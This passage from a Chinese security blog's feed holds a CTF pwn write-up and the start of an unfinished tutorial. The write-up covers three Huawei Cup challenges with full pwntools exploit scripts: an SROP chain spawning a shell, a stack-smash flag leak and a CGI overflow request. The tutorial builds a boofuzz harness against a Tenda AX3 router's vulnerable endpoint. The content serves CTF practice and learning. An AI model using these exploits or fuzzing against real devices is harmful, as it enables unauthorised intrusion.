blog</a></p><p><a href="https://www.cnblogs.com/winmt/articles/17018284.html">NepnepxCATCTF Pwn-Chao WriteUp - winmt - 博客园 (cnblogs.com)</a></p><p><a href="https://www.roderickchan.cn/zh-cn/2023-02-02-2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-jit/">2023西湖论剑初赛pwn-jit - roderick - record and learn! (roderickchan.cn)</a></p><p><a href="https://lst-oss.github.io/2023/08/23/jit-pwn/#2023-wmctf-jit">jit-pwn - Hexo (lst-oss.github.io)</a></p>]]></content>
    
    
    <categories>
      
      <category>Record-of-Learn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
      <tag>CTF</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>华为杯</title>
    <link href="/2023/09/28/%E5%8D%8E%E4%B8%BA%E6%9D%AF/"/>
    <url>/2023/09/28/%E5%8D%8E%E4%B8%BA%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0:写在所有之前"></a>0x0:写在所有之前</h1><p>别问，问就是👴忘记找研院的联系老师审核了，报名没报上，捏麻麻滴。一想到进决赛就能回浙江耍，我身上仿佛有蚂蚁在爬</p><p>🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡</p><h1 id="0x1-pwn题解"><a href="#0x1-pwn题解" class="headerlink" title="0x1:pwn题解"></a>0x1:pwn题解</h1><h2 id="master-of-asm"><a href="#master-of-asm" class="headerlink" title="master of asm"></a>master of asm</h2><p>什么👴敢叫自己master of asm啊，知不知道自己有几斤小马珍珠啊</p><p>就简单的srop</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">from pwn import *<br>import sys<br><span class="hljs-built_in">context</span>.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-built_in">context</span>.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>flag = <span class="hljs-number">0</span><br>if flag:<br>    p = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-symbol">else:</span><br>    p = process(<span class="hljs-string">&quot;./a.out&quot;</span>)<br>sa = lambda s,n : p.sendafter(s,n)<br>sla = lambda s,n : p.sendlineafter(s,n)<br>sl = lambda s : p.sendline(s)<br>sd = lambda s : p.send(s)<br>rc = lambda n : p.recv(n)<br>ru = lambda s : p.recvuntil(s)<br>ti = lambda : p.interactive()<br>leak = lambda name,<span class="hljs-keyword">addr </span>:log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+hex(<span class="hljs-keyword">addr))</span><br><span class="hljs-keyword"></span><br><span class="hljs-keyword">xor_0 </span>= <span class="hljs-number">0x40103d</span><br>rax_2 = <span class="hljs-number">0x401030</span><br><span class="hljs-keyword">xor_1 </span>= <span class="hljs-number">0x401034</span><br><span class="hljs-keyword">syscall </span>= <span class="hljs-number">0x40102d</span><br><span class="hljs-keyword">bin_sh </span>= <span class="hljs-number">0x40200a</span><br><br>exec_fun = SigreturnFrame()<br>exec_fun.rax = <span class="hljs-number">0x3b</span><br>exec_fun.rdi = <span class="hljs-keyword">bin_sh</span><br><span class="hljs-keyword"></span>exec_fun.rsi = <span class="hljs-number">0</span><br>exec_fun.rdx = <span class="hljs-number">0</span><br>exec_fun.rip = <span class="hljs-keyword">syscall</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">shellcode </span>= p64(<span class="hljs-keyword">xor_0)\</span><br><span class="hljs-keyword"></span>            + p64(<span class="hljs-keyword">xor_1)\</span><br><span class="hljs-keyword"></span>            + p64(rax_2)\<br>            + p64(<span class="hljs-keyword">xor_1)\</span><br><span class="hljs-keyword"></span>            + p64(rax_2)\<br>            + p64(<span class="hljs-keyword">xor_1)\</span><br><span class="hljs-keyword"></span>            + p64(rax_2)\<br>            + p64(<span class="hljs-keyword">xor_1)\</span><br><span class="hljs-keyword"></span>            + p64(<span class="hljs-keyword">syscall)\</span><br><span class="hljs-keyword"></span>            + <span class="hljs-keyword">bytes(exec_fun)</span><br><span class="hljs-keyword"></span><br>p.send(<span class="hljs-keyword">shellcode.ljust(0x190,b&#x27;\x00&#x27;))</span><br><span class="hljs-keyword"></span>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ez-ssp"><a href="#ez-ssp" class="headerlink" title="ez_ssp"></a>ez_ssp</h2><p>👴当初铸币了，👴知道是stack smash，但👴不知道为什么一直在想一次溢出就把flag泄露出来，爆破栈地址爆了好久都没成功。</p><p>然后结果只要轻轻泄露got表地址，再用libc把_environ里的栈地址拿出来就好了，草</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs vim">from pwn import *<br>import sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    <span class="hljs-keyword">p</span> = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">p</span> = process(<span class="hljs-string">&quot;./ssp&quot;</span>)<br><span class="hljs-keyword">sa</span> = lambda s,n : <span class="hljs-keyword">p</span>.sendafter(s,n)<br><span class="hljs-keyword">sla</span> = lambda s,n : <span class="hljs-keyword">p</span>.sendlineafter(s,n)<br><span class="hljs-keyword">sl</span> = lambda s : <span class="hljs-keyword">p</span>.sendline(s)<br>sd = lambda s : <span class="hljs-keyword">p</span>.send(s)<br>rc = lambda n : <span class="hljs-keyword">p</span>.recv(n)<br><span class="hljs-keyword">ru</span> = lambda s : <span class="hljs-keyword">p</span>.recvuntil(s)<br>ti = lambda : <span class="hljs-keyword">p</span>.interactive()<br>leak = lambda name,addr :<span class="hljs-built_in">log</span>.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+hex(addr))<br># gdb.attach(<span class="hljs-keyword">p</span>,<span class="hljs-string">&#x27;b __stack_chk_fail\nc\n&#x27;</span>)<br><br>randon = []<br><br><span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;?\n&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;: &#x27;</span>)<br>randon.<span class="hljs-keyword">append</span>(<span class="hljs-keyword">int</span>(rc(<span class="hljs-number">2</span>),<span class="hljs-number">10</span>))<br><span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;?\n&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x128 + p64(<span class="hljs-number">0</span>x602018))<br><span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;***: &#x27;</span>)<br>libc.address = u64(<span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc.address&quot;</span>,libc.address)<br><br><span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;?\n&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;: &#x27;</span>)<br>randon.<span class="hljs-keyword">append</span>(<span class="hljs-keyword">int</span>(rc(<span class="hljs-number">2</span>),<span class="hljs-number">10</span>))<br><span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;?\n&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x128 + p64(libc.sym[<span class="hljs-string">&#x27;_environ&#x27;</span>]))<br><span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;***: &#x27;</span>)<br>stack = u64(<span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;stack&quot;</span>,stack)<br><br>flag_addr = stack - <span class="hljs-number">0</span>x178<br><span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;?\n&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;: &#x27;</span>)<br>randon.<span class="hljs-keyword">append</span>(<span class="hljs-keyword">int</span>(rc(<span class="hljs-number">2</span>),<span class="hljs-number">10</span>))<br><span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;?\n&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0</span>x128 + p64(flag_addr))<br><span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;: &#x27;</span>)<br>flag = rc(<span class="hljs-number">50</span>)<br><br><span class="hljs-keyword">print</span>(randon)<br>flag_list = <span class="hljs-keyword">list</span>(flag)  # 将字符串转换为列表，以便进行修改<br><span class="hljs-keyword">print</span>(flag_list)<br><br><span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(randon)):<br>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">j</span> in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag_list)):<br>        flag_list[<span class="hljs-keyword">j</span>] = flag_list[<span class="hljs-keyword">j</span>] ^ randon[<span class="hljs-number">2</span>-i]<br><br>flag_txt = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag_list)):<br>    flag_txt = flag_txt + chr(flag_list[i])<br><span class="hljs-keyword">print</span>(flag_txt)<br><span class="hljs-keyword">p</span>.interactive()<br></code></pre></td></tr></table></figure><h2 id="APACHE-CGI-PWN"><a href="#APACHE-CGI-PWN" class="headerlink" title="APACHE-CGI-PWN"></a>APACHE-CGI-PWN</h2><p>👴一直以为这是个很吊的web pwn，然后浩哥哥直接秒了，👴才发现是个小瘪三</p><p>话说最近怎么这么喜欢出套着web皮的 cgi pwn题吗，陇剑也是</p><p>这边直接偷浩哥哥的exp了，嘻嘻</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>import requests<br>context(<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&quot;ROOT-GOD=Every king&#x27;s blood will end with a sword&quot;</span>,<br>    <span class="hljs-string">&#x27;CONTENT_LENGTH&#x27;</span>:<span class="hljs-string">&#x27;99999&#x27;</span><br>&#125;<br><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*(0xe8)+p64(0x4032fc)+p64(0x4032E0)<br>cookie = requests.post(<span class="hljs-string">&#x27;http://ip:port/getcookie.cgi&#x27;</span>,<span class="hljs-attribute">data</span>=<span class="hljs-string">&quot;eeknight&quot;</span>,headers=headers)<br>check = requests.post(<span class="hljs-string">&#x27;http://ip:port/check-ok.cgi&#x27;</span>, data = payload,<span class="hljs-attribute">headers</span>=headers)<br><br>p = requests.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;http://ip:port/flag&#x27;</span>)<br><span class="hljs-built_in">print</span>(cookie.text)<br><span class="hljs-built_in">print</span>(check.text)<br><span class="hljs-built_in">print</span>(p.text)<br></code></pre></td></tr></table></figure><h1 id="0x3-最后的最后"><a href="#0x3-最后的最后" class="headerlink" title="0x3:最后的最后"></a>0x3:最后的最后</h1><p>有什么好说的呢，就这样吧</p>]]></content>
    
    
    <categories>
      
      <category>CtfMatch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF、Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>令人疑惑的boofuzz</title>
    <link href="/2023/08/26/boofuzz/"/>
    <url>/2023/08/26/boofuzz/</url>
    
    <content type="html"><![CDATA[<h1 id="令人疑惑的boofuzz"><a href="#令人疑惑的boofuzz" class="headerlink" title="令人疑惑的boofuzz"></a>令人疑惑的boofuzz</h1><p>本文最后更新于：2023年8月22日 晚上</p><h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0: 写在所有之前"></a>0x0: 写在所有之前</h1><p>boofuzz这一基于生成的fuzz框架，笔者一直有所耳闻</p><p>且在笔者学习Iot后，对于能fuzz网络协议的boofuzz，更是产生的极大的兴趣。所以，笔者抱着学习boofuzz后能在Iot漏洞挖掘中提高效率的目的于最近浅浅的接触了一下boofuzz。</p><p>然后，没有然后了</p><p>给笔者整破防了，直接原地道心破碎</p><p>PS：笔者这篇文章主要是记一点无用的板子和吐槽，各位大师傅如果想看源码解析或者逻辑思路的可以点×了。</p><h1 id="0x1-还算正经的板子"><a href="#0x1-还算正经的板子" class="headerlink" title="0x1: 还算正经的板子"></a>0x1: 还算正经的板子</h1><p>笔者这边fuzz的target是Tenda AX3</p><p>首先要抓包抓一点原始数据</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-apache"><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.0.1</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">115</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5790</span>.<span class="hljs-number">171</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Sec</span>-Purpose: prefetch;prerender</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Purpose</span>: prefetch</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Connection</span>: close</span><br></code></pre></td></tr></table></figure><p>其实根据这个就可以写原语了，但这个Request是login请求，没什么多大意义</p><p>于是笔者找了个存在漏洞的函数接口，先fuzz试试效果</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> boofuzz import *<br><br><br>def main():<br>    host = <span class="hljs-string">&#x27;192.168.0.1&#x27;</span><br>   <span class="hljs-built_in"> port </span>= 80<br>    <br>    # 设置<span class="hljs-built_in"> logging </span>配置<br>    csv_log = open(<span class="hljs-string">&#x27;fuzz_results.csv&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-attribute">encoding</span>=<span class="hljs-string">&#x27;utf-8&#x27;</span>) #python3要设置字符串，byte会报错<br>    my_logger = [FuzzLoggerCsv(<span class="hljs-attribute">file_handle</span>=csv_log)] #将日志写入csv文件<br><br>    session = Session(<br>        <span class="hljs-attribute">target</span>=Target(<br>            <span class="hljs-attribute">connection</span>=SocketConnection(host,port,proto=&#x27;tcp&#x27;),<br>        ),<br>        <span class="hljs-attribute">receive_data_after_fuzz</span>=<span class="hljs-literal">True</span>,#接受程序返回的数据<br>        <span class="hljs-attribute">ignore_connection_reset</span>=<span class="hljs-literal">True</span>,<br>        <span class="hljs-attribute">restart_sleep_time</span>=10,<br>        <span class="hljs-attribute">crash_threshold_element</span>=1,#会停止在第一次crash的地方<br>        <span class="hljs-attribute">fuzz_loggers</span>=my_logger,<br>    )<br>    <br>    s_initialize(<span class="hljs-string">&quot;Request&quot;</span>)<br>    #line1<br>    s_static(<span class="hljs-string">&quot;POST&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Method&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-1-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;/goform/SetNetControlList&quot;</span>) #漏洞存在接口<br>    s_static(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-1-2&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;HTTP/1.1&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;HTTP_VERSION&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-1&quot;</span>)<br>    #line2<br>    s_static(<span class="hljs-string">&quot;Host:&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-2-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;192.168.0.1&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;IP_ADDRESS&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-2&quot;</span>)<br>    #line3<br>    s_static(<span class="hljs-string">&quot;Content-Length:&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Content-Length&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-3-1&quot;</span>)<br>    s_size(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-attribute">output_format</span>=<span class="hljs-string">&#x27;ascii&#x27;</span>,fuzzable=False)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-3&quot;</span>)<br>    #line4<br>    s_static(<span class="hljs-string">&quot;Accept:&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Accept&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-4-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;*/*&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Accept-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-4&quot;</span>)<br>    #line5<br>    s_static(<span class="hljs-string">&quot;X-Requested-With:&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;X-Requested-With&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-5-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;XMLHttpRequest&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;X-Requested-With-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-5&quot;</span>)<br>    #line6<br>    s_static(<span class="hljs-string">&quot;User-Agent:&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;User-Agent&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-6-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;User-Agent-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-6&quot;</span>)<br>    #line7<br>    s_static(<span class="hljs-string">&quot;Content-Type:&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Content-Type&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-7-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Content-Type-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-7&quot;</span>)<br>    #line8<br>    s_static(<span class="hljs-string">&quot;Origin:&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Origin&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-8-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;http://192.168.0.1&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Origin-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-8&quot;</span>)<br>    #line9<br>    s_static(<span class="hljs-string">&quot;Referer:&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Referer&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-9-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;http://192.168.0.1/wireless_ssid.html?random=0.7532778770368576&amp;&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Referer-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-9&quot;</span>)<br>    #line10<br>    s_static(<span class="hljs-string">&quot;Accept-Encoding:&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Accept-Encoding&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-10-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Accept-Encoding-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span 